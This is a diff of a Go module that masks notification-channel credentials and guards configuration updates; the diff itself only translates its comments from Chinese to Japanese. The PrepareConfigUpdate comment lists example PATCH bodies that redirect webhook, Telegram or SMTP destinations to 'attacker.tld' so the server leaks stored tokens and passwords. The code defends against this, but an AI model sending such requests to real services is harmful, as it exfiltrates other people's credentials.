@@ -6,21 +6,24 @@ import (
 	"strings"
 )
 
-// MaskedPrefix 是掩码值的标记前缀。API 回显凭据时用带此前缀的值替换真实内容，
-// 更新接口收到带此前缀的值即理解为「保持库中原值不变」。
+// MaskedPrefix はマスク値の標識となる接頭辞。API が資格情報を返すときはこの
+// 接頭辞付きの値で実体を置き換え、更新 API がこの接頭辞付きの値を受け取ったら
+// 「DB 内の元の値を不変のまま維持する」と解釈する。
 //
-// 用前缀而不是空串或某个固定常量，是为了能顺带带上一点可辨识信息
-// （见 MaskedValue），让用户区分得出「这是哪个机器人」而不必重新粘贴密钥。
+// 空文字列や固定の定数ではなく接頭辞にしているのは、識別のヒントを少しだけ
+// 添えられるようにするため（MaskedValue を参照）。ユーザーは「これがどのボットか」
+// を区別でき、キーを貼り直さずに済む。
 const MaskedPrefix = "__masked__"
 
-// MaskedValue 生成一个掩码值：
+// MaskedValue はマスク値を生成する：
 //
-//	"__masked__"              原值太短，不给任何提示
-//	"__masked__:…ab12cd"      带上原值末 6 位作为辨识提示
+//	"__masked__"              元の値が短すぎてヒントを出さない
+//	"__masked__:…ab12cd"      元の値の末尾 6 文字を識別ヒントとして付ける
 //
-// 只暴露末 6 位是刻意选择的：Webhook 地址的辨识信息在末段（如企业微信的 key、
-// 飞书的机器人 id），而前缀部分各机器人相同、没有辨识价值。末 6 位不足以
-// 还原凭据，但足以让配置者认出「是我那个群」。
+// 末尾 6 文字だけを露出するのは意図的な選択：Webhook アドレスの識別情報は末尾に
+// あり（WeCom の key、Lark のボット id など）、前方は各ボットで共通で識別価値がない。
+// 末尾 6 文字では資格情報を復元できないが、設定者は「自分のあのグループだ」と
+// 分かる。
 func MaskedValue(secret string) string {
 	if len(secret) <= 6 {
 		return MaskedPrefix
@@ -28,14 +31,17 @@ func MaskedValue(secret string) string {
 	return MaskedPrefix + ":…" + secret[len(secret)-6:]
 }
 
-// IsMasked 报告某个值是否为掩码值（即接口回显后未被修改）。
+// IsMasked はある値がマスク値かどうか（つまり API 応答後に変更されていないか）を
+// 報告する。
 func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }
 
-// MaskConfig 返回配置的副本，把该渠道的凭据字段替换成掩码值。
+// MaskConfig は設定のコピーを返し、そのチャネルの資格情報フィールドをマスク値に
+// 置き換える。
 //
-// 未知渠道类型返回空 map 而不是原配置——宁可让 UI 显示「配置不可用」，
-// 也不要在渠道类型无法识别时把可能含凭据的原始内容整个吐回去。
-// 非凭据字段原样保留，UI 才能正常展示。
+// 未知のチャネル種別では元の設定ではなく空の map を返す——UI に「設定は利用
+// できません」と表示する方が、チャネル種別を識別できないときに資格情報を含みうる
+// 元の内容を丸ごと吐き出すよりまし。資格情報以外のフィールドはそのまま残し、
+// UI が正常に表示できるようにする。
 func MaskConfig(kind string, cfg map[string]any) map[string]any {
 	channel, ok := Get(kind)
 	if !ok {
@@ -51,8 +57,9 @@ func MaskConfig(kind string, cfg map[string]any) map[string]any {
 			out[k] = v
 			continue
 		}
-		// headers 这类嵌套结构整体按一个凭据处理：逐个子键判断需要每个渠道
-		// 再声明一套「哪些子键是凭据」的规则，复杂度远超收益。
+		// headers のようなネスト構造は丸ごと 1 つの資格情報として扱う：サブキーを
+		// 個別に判定するにはチャネルごとに「どのサブキーが資格情報か」の規則を
+		// 宣言する必要があり、複雑さが利得をはるかに上回る。
 		if s, ok := v.(string); ok {
 			out[k] = MaskedValue(s)
 			continue
@@ -62,62 +69,72 @@ func MaskConfig(kind string, cfg map[string]any) map[string]any {
 	return out
 }
 
-// ErrDestinationChangedWithoutCredentials 表示「目标地址变了，但调用方没有对
-// 凭据字段表态」。返回它而不是默默放行或默默丢弃凭据，理由见 PrepareConfigUpdate。
+// ErrDestinationChangedWithoutCredentials は「宛先アドレスが変わったのに、呼び出し側が
+// 資格情報フィールドについて意思表示していない」ことを表す。黙って通すのでも黙って
+// 資格情報を捨てるのでもなくこれを返す理由は PrepareConfigUpdate を参照。
 type ErrDestinationChangedWithoutCredentials struct {
-	Changed []string // 发生变化的目的地键
-	Missing []string // 未显式表态的凭据键
+	Changed []string // 変化した宛先キー
+	Missing []string // 明示的な意思表示のない資格情報キー
 }
 
 func (e *ErrDestinationChangedWithoutCredentials) Error() string {
-	return "目标地址（" + strings.Join(e.Changed, "、") + "）已变更，请同时重新填写凭据字段（" +
-		strings.Join(e.Missing, "、") + "）：填入新值，或显式留空表示不再需要凭据。" +
-		"原凭据只对旧地址有效，继续沿用等于把它交给新地址。"
+	return "宛先アドレス（" + strings.Join(e.Changed, "、") + "）が変更されました。あわせて資格情報フィールド（" +
+		strings.Join(e.Missing, "、") + "）を再入力してください：新しい値を入力するか、資格情報が不要なら明示的に空欄にしてください。" +
+		"元の資格情報は旧アドレスにしか有効でなく、そのまま使い続けることは新しいアドレスへ渡すことに等しい。"
 }
 
-// PrepareConfigUpdate 合并渠道配置，并处理「目标地址变更」这一安全敏感情况。
+// PrepareConfigUpdate はチャネル設定をマージし、「宛先アドレスの変更」という
+// セキュリティ上重要な状況を処理する。
 //
-// 它替代裸的 MergeConfig 用在渠道更新路径上，解决的是这样一条实测可行的路径：
-// 目标地址（消息发往哪）与凭据（用什么身份发）是两套独立字段，而 MergeConfig
-// 对「未提及的键」一律保留库中原值。于是任何能 PATCH 渠道的人只要**只改地址、
-// 对凭据避而不谈**，就能让服务器把库里的真凭据发到自己控制的端点：
+// 生の MergeConfig の代わりにチャネル更新経路で使うもので、実際に成立した次の
+// 経路を塞ぐ：宛先アドレス（メッセージをどこへ送るか）と資格情報（どの身分として
+// 送るか）は独立した 2 系統のフィールドで、MergeConfig は「言及されていないキー」を
+// 一律に DB の元の値で保持する。するとチャネルを PATCH できる者は、**アドレスだけ
+// 変えて資格情報に触れずに素通りさせる**だけで、サーバーに DB の本物の資格情報を
+// 自分が支配するエンドポイントへ送らせられる：
 //
-//	webhook  {config:{url:"https://attacker.tld"}}  → 原始 Authorization 头随请求外发
-//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
-//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 后交出用户名与密码
+//	webhook  {config:{url:"https://attacker.tld"}}  → 元の Authorization ヘッダーがリクエストと共に外へ
+//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<本物のToken>/sendMessage
+//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 後にユーザー名とパスワードを渡す
 //
-// 这条路径完全静默、不依赖重定向（所以拒绝跨主机跳转挡不住它），
-// 而且直接击穿了本包掩码机制的目标——「凭据不回显给浏览器」。
+// この経路は完全に静かで、リダイレクトにも依存せず（だからクロスホストのジャンプ
+// 拒否では止められない）、しかも本パッケージのマスク機構の目的——「資格情報を
+// ブラウザに返さない」——を直接突き崩す。
 //
-// 规则：只要某个目的地键被改成新值，调用方就必须对**每一个**凭据键显式表态：
-//   - 给出新值 → 用新值
-//   - 显式传空串 → 该字段不再需要凭据（保留清空语义）
-//   - 原样回传掩码值 / 干脆不提这个键 → 拒绝
+// 規則：宛先キーのいずれかが新しい値に変わったら、呼び出し側は**すべての**資格情報
+// キーについて明示的に意思表示しなければならない：
+//   - 新しい値を渡す → 新しい値を使う
+//   - 明示的に空文字列を渡す → そのフィールドに資格情報は不要（クリアの意味は保持）
+//   - マスク値をそのまま返す／キーにまったく触れない → 拒否
 //
-// 第三种之所以也拒绝，是因为「掩码值」的含义正是「沿用旧凭据」，而旧凭据
-// 只对旧地址有效。这里刻意不做「自动丢弃凭据」——那对可选凭据字段
-// （webhook 的 headers、email 的 password）会静默变成「鉴权没了但接口返回 200」，
-// 比报错更难排查。宁可让操作者多填一次。
+// 3 番目も拒否するのは、「マスク値」の意味がまさに「旧資格情報を引き継ぐ」であり、
+// 旧資格情報は旧アドレスにしか有効でないため。ここで意図的に「資格情報を自動で
+// 捨てる」ことをしないのは、任意の資格情報フィールド（webhook の headers、email の
+// password）だと黙って「認証はなくなったのに API は 200 を返す」状態になり、エラー
+// より原因究明が難しいから。操作者に 1 回余計に入力してもらう方がまし。
 func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
 	channel, ok := Get(kind)
 	if !ok {
-		return nil, fmt.Errorf("渠道类型 %q 未注册", kind)
+		return nil, fmt.Errorf("チャネル種別 %q は登録されていません", kind)
 	}
 	secrets := channel.SecretKeys()
 	destinations := channel.DestinationKeys()
 
-	// 非字符串的凭据值（如 webhook 的 headers 是个对象）里若嵌着掩码字面量，
-	// 说明调用方把「保持原值」的哨兵塞进了结构体内部。MergeConfig 只认「字符串
-	// 且带前缀」为掩码，这种形态会被当普通对象原样存下去——库里真的落下字面量
-	// "__masked__"，后续鉴权静默失效且没有任何报错。宁可拒掉。
+	// 文字列でない資格情報の値（webhook の headers はオブジェクト）にマスクの
+	// リテラルが埋まっている場合、呼び出し側が「元の値を維持」のセンチネルを構造体の
+	// 内部に詰め込んだことを意味する。MergeConfig は「文字列かつ接頭辞付き」だけを
+	// マスクと認識するので、この形は普通のオブジェクトとしてそのまま保存され——DB に
+	// 本当にリテラル "__masked__" が残り、以後の認証が静かに失敗し、エラーも一切
+	// 出ない。拒否する方がまし。
 	//
-	// 这个检查必须放在**最前面**：地址没变时会走提前返回，放在后面就等于
-	// 只覆盖了「改地址」这一条路径（第一版就是这么放错的，测试直接抓到了）。
+	// この検査は**先頭**に置かなければならない：アドレスが変わっていないときは
+	// 早期リターンするので、後ろに置くと「アドレス変更」という 1 経路しかカバー
+	// できない（初版はそう置き間違え、テストが即座に捕まえた）。
 	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
 		return nil, err
 	}
 
-	// 找出真正被改掉的目的地键。掩码值等于「没改」。
+	// 実際に変更された宛先キーを探す。マスク値は「変更なし」と同じ。
 	var changed []string
 	for _, key := range destinations {
 		raw, present := incoming[key]
@@ -133,11 +150,12 @@ func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[stri
 		}
 	}
 	if len(changed) == 0 {
-		// 地址没变，走普通合并（掩码值保留原值、空串清空、其余覆盖）。
+		// アドレスは変わっていないので、通常のマージを通す（マスク値は元の値を保持、
+		// 空文字列はクリア、それ以外は上書き）。
 		return MergeConfig(stored, incoming), nil
 	}
 
-	// 地址变了：要求对每个凭据键显式表态。
+	// アドレスが変わった：すべての資格情報キーについて明示的な意思表示を要求する。
 	var missing []string
 	for _, key := range secrets {
 		raw, present := incoming[key]
@@ -155,11 +173,13 @@ func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[stri
 	return MergeConfig(stored, incoming), nil
 }
 
-// rejectMaskedInContainers 拒绝把掩码哨兵嵌在非字符串结构里提交。
+// rejectMaskedInContainers は、マスクのセンチネルを文字列でない構造に埋め込んで
+// 送信することを拒否する。
 //
-// 掩码机制的前提是「整个值就是个字符串」。像 webhook 的 headers 这种对象字段，
-// 只能整体掩码（写成字符串 "__masked__"）或整体提交；把哨兵塞进对象内部
-// 既表达不了「保持不变」，又会被当成真实值存进库。
+// マスク機構の前提は「値全体が文字列であること」。webhook の headers のような
+// オブジェクトフィールドは、丸ごとマスクする（文字列 "__masked__" にする）か丸ごと
+// 送信するかしかできず、センチネルをオブジェクト内部に詰め込むと「変更しない」を
+// 表現できず、しかも実値として DB に保存されてしまう。
 func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
 	for _, key := range secretKeys {
 		raw, present := incoming[key]
@@ -174,26 +194,29 @@ func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) erro
 			continue
 		}
 		if strings.Contains(string(encoded), MaskedPrefix) {
-			return fmt.Errorf("字段 %s 的内容里含掩码标记 %q：该字段只能整体留空表示沿用、或整体提交新值，不能在结构体内部夹带掩码占位",
+			return fmt.Errorf("フィールド %s の内容にマスク標識 %q が含まれています：このフィールドは丸ごと空欄にして引き継ぐか、丸ごと新しい値を送信するかしかできず、構造体の内部にマスクのプレースホルダーを紛れ込ませることはできません",
 				key, MaskedPrefix)
 		}
 	}
 	return nil
 }
 
-// sameConfigValue 比较两个配置值是否等价。用 JSON 序列化比较是为了顺带处理
-// 类型差异——前端提交的端口是 number，而库里读回来的是 float64，直接 == 会误判。
+// sameConfigValue は 2 つの設定値が等価かどうかを比較する。JSON シリアライズで
+// 比較するのは、型の差異を一緒に処理するため——フロントが送るポートは number だが、
+// DB から読み戻すと float64 で、直接 == で比べると誤判定する。
 //
-// 「空」必须先归一化再比较：空串与「键不存在」在这个配置模型里是同一个状态，
-// 因为 MergeConfig 把空串当显式清空、直接 delete 掉该键。不归一化的话，一个
-// 始终留空的可选目的地字段（Telegram 的 base_url 是唯一这样的字段：留空即用
-// 官方地址）会走成这条路径——
+// 「空」は先に正規化してから比較しなければならない：空文字列と「キーが存在しない」は
+// この設定モデルでは同じ状態であり、MergeConfig は空文字列を明示的クリアとみなして
+// そのキーを delete する。正規化しないと、常に空欄の任意の宛先フィールド
+// （Telegram の base_url が唯一そのようなフィールド：空欄なら公式アドレス）が
+// この経路を辿ってしまう：
 //
-//	新建时存下 base_url:""  →  第一次保存被 MergeConfig 删键
-//	→ 第二次保存时 incoming 是 ""、stored 缺键，被判成「地址变了」
-//	→ 凭据是掩码值 → 400「目标地址已变更，请同时重新填写凭据字段」
+//	新規作成時に base_url:"" が保存される  →  最初の保存で MergeConfig がキーを削除
+//	→ 2 回目の保存で incoming は ""、stored にはキーがないので「アドレスが変わった」と判定
+//	→ 資格情報はマスク値 → 400「宛先アドレスが変更されました。あわせて資格情報フィールドを再入力してください」
 //
-// 此后每次保存都失败，除非用户重新粘贴一遍 Bot Token，而他什么都没改。
+// 以後、ユーザーが何も変えていないのに保存のたびに失敗し、Bot Token を貼り直すまで
+// 直らない。
 func sameConfigValue(a, b any) bool {
 	if isBlankConfigValue(a) && isBlankConfigValue(b) {
 		return true
@@ -206,9 +229,10 @@ func sameConfigValue(a, b any) bool {
 	return string(ra) == string(rb)
 }
 
-// isBlankConfigValue 判定一个配置值是否为「空」。
-// 口径必须与 MergeConfig 的清空判定一致（strings.TrimSpace(s) == ""），
-// 否则会出现「MergeConfig 认为该删、sameConfigValue 认为有值」的夹缝。
+// isBlankConfigValue は設定値が「空」かどうかを判定する。
+// 基準は MergeConfig のクリア判定（strings.TrimSpace(s) == ""）と一致させること。
+// そうでないと「MergeConfig は削除すべきと考え、sameConfigValue は値ありと考える」
+// 隙間が生まれる。
 func isBlankConfigValue(v any) bool {
 	if v == nil {
 		return true
@@ -217,18 +241,20 @@ func isBlankConfigValue(v any) bool {
 	return ok && strings.TrimSpace(s) == ""
 }
 
-// MergeConfig 把 incoming 合并到 stored 之上，用于更新渠道配置。
+// MergeConfig は incoming を stored の上にマージし、チャネル設定の更新に使う。
 //
-// 规则：
-//   - incoming 里值为掩码的键 → 保留 stored 的原值（用户没改这个字段）
-//   - incoming 里值为空串的键 → 视为显式清空，删除该键
-//   - 其余键 → 用 incoming 的值覆盖
-//   - stored 里有而 incoming 里没有的键 → 保留（局部更新语义）
+// 規則：
+//   - incoming で値がマスクのキー → stored の元の値を保持（ユーザーがそのフィールドを変更していない）
+//   - incoming で値が空文字列のキー → 明示的クリアとみなしてそのキーを削除
+//   - それ以外のキー → incoming の値で上書き
+//   - stored にあって incoming にないキー → 保持（部分更新の意味論）
 //
-// 空串是否算「清空」需要明确：前端表单把未填的字段提交为空串，
-// 若把它当成有效值写入，会把「留空以保留原值」的字段真的清掉。
-// 这里选择显式清空，因为要清除一个设错的字段时，用户没有别的表达方式
-// （拖走字段可区分「未提供」与「提供空值」，但 UI 用不到这个区别）。
+// 空文字列を「クリア」とみなすかを明確にする必要がある：フロントのフォームは
+// 未入力のフィールドを空文字列で送信するので、これを有効な値として書き込むと、
+// 「空欄にして元の値を保持する」はずのフィールドを本当に消してしまう。
+// ここでは明示的クリアを選ぶ。設定を誤ったフィールドを消したいときに、ユーザーには
+// 他に表現する手段がないため（フィールドを外すことで「未指定」と「空値を指定」を
+// 区別できるが、UI ではこの区別を使っていない）。
 func MergeConfig(stored, incoming map[string]any) map[string]any {
 	out := make(map[string]any, len(stored)+len(incoming))
 	for k, v := range stored {
@@ -237,7 +263,7 @@ func MergeConfig(stored, incoming map[string]any) map[string]any {
 	for k, v := range incoming {
 		if s, ok := v.(string); ok {
 			if IsMasked(s) {
-				continue // 掩码值 = 未修改，保留 stored
+				continue // マスク値 = 未変更なので stored を保持
 			}
 			if strings.TrimSpace(s) == "" {
 				delete(out, k)
